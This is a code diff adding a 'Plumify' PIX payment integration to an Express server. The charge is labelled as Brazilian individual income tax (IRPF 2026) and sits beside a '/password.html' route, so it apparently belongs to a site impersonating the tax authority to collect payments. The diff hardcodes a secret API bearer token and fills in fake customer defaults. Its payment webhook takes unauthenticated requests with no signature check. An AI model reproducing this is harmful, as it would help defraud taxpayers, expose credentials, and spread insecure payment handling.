@@ -223,6 +223,105 @@ app.get('/password.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'password.html'));
 });
 
+// ==================== INTEGRAÇÃO PLUMIFY ====================
+const crypto = require('crypto');
+const axios = require('axios');
+
+// Configurações Plumify
+const PLUMIFY_PRODUCT_HASH = 'smm88ihfg0';
+const PLUMIFY_API_TOKEN = '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa';
+const PLUMIFY_API_URL = 'https://api.plumify.com.br/v1';
+
+// Função para gerar ID único da transação
+function generateTransactionId() {
+    return 'TX-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
+}
+
+// Rota para criar pagamento via Plumify
+app.post('/api/create-payment', async (req, res) => {
+    const { amount, customer_name, customer_email, customer_cpf } = req.body;
+
+    if (!amount || amount <= 0) {
+        return res.status(400).json({ error: 'Valor inválido' });
+    }
+
+    try {
+        const payload = {
+            product_hash: PLUMIFY_PRODUCT_HASH,
+            amount: parseFloat(amount),
+            currency: 'BRL',
+            reference_id: generateTransactionId(),
+            customer: {
+                name: customer_name || 'Contribuinte',
+                email: customer_email || 'pagador@exemplo.com',
+                cpf: customer_cpf || '00000000000'
+            },
+            items: [{
+                description: 'Imposto de Renda Pessoa Física - IRPF 2026',
+                quantity: 1,
+                amount: parseFloat(amount)
+            }],
+            payment_methods: ['pix']
+        };
+
+        // Chamada para API Plumify
+        const response = await axios.post(`${PLUMIFY_API_URL}/transactions`, payload, {
+            headers: {
+                'Authorization': `Bearer ${PLUMIFY_API_TOKEN}`,
+                'Content-Type': 'application/json'
+            }
+        });
+
+        res.json({
+            success: true,
+            payment: response.data
+        });
+
+    } catch (error) {
+        console.error('Erro Plumify:', error.response?.data || error.message);
+        res.status(500).json({
+            error: 'Erro ao gerar pagamento. Tente novamente.'
+        });
+    }
+});
+
+// Rota para consultar status do pagamento
+app.get('/api/payment-status/:reference_id', async (req, res) => {
+    const { reference_id } = req.params;
+    
+    try {
+        const response = await axios.get(`${PLUMIFY_API_URL}/transactions/${reference_id}`, {
+            headers: {
+                'Authorization': `Bearer ${PLUMIFY_API_TOKEN}`
+            }
+        });
+        
+        res.json({
+            success: true,
+            status: response.data.status
+        });
+    } catch (error) {
+        res.status(500).json({ error: 'Erro ao consultar pagamento' });
+    }
+});
+
+// Webhook para receber confirmações de pagamento
+app.post('/api/webhook/pagamento', async (req, res) => {
+    const { reference_id, status, amount } = req.body;
+    
+    console.log(`📢 Webhook recebido: Transação ${reference_id} - Status: ${status}`);
+    
+    // Aqui você pode salvar no banco de dados o status do pagamento
+    try {
+        // Salvar no banco se quiser
+        // await pool.query('INSERT INTO pagamentos (reference_id, status, amount, data) VALUES ($1, $2, $3, NOW())', [reference_id, status, amount]);
+        
+        res.json({ received: true });
+    } catch (error) {
+        res.status(500).json({ error: 'Erro ao processar webhook' });
+    }
+});
+
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Servidor rodando na porta ${PORT}`);
